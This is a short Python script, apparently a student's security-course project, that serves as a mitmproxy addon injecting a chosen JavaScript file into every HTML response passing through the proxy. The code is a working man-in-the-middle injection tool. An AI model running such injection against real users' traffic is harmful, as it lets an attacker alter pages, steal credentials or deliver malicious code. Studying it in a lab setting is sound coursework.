"""
COMP4334 - Project 5

Script Injection
This script injects a javascript file into the response traffic.
To be used with mitmdump/mitmproxy.


--Zander
"""

import sys
from bs4 import BeautifulSoup
#from mitmproxy import ctx, http

class Injector:
    def __init__(self, src):
        self.src_url = src

    def response(self, flow):
        jsContents = ""
        f = open(self.src_url)
        jsContents = f.read()
        # avoid this host to be injected
        if flow.request.host in self.src_url:
            return
        html = BeautifulSoup(flow.response.content, "html.parser")
        if html.body: 
            js_inject = html.new_tag(
                    "script",
                    type='application/javascript')
            js_inject.string = jsContents
            html.body.insert(0, js_inject)
            flow.response.content = str(html).encode("utf8")

# Kind of like a constructor
def start():
    if len(sys.argv) !=2:
        raise ValueError('Usage: -s "injectJS.py JSFILE"')
    return Injector(sys.argv[1])


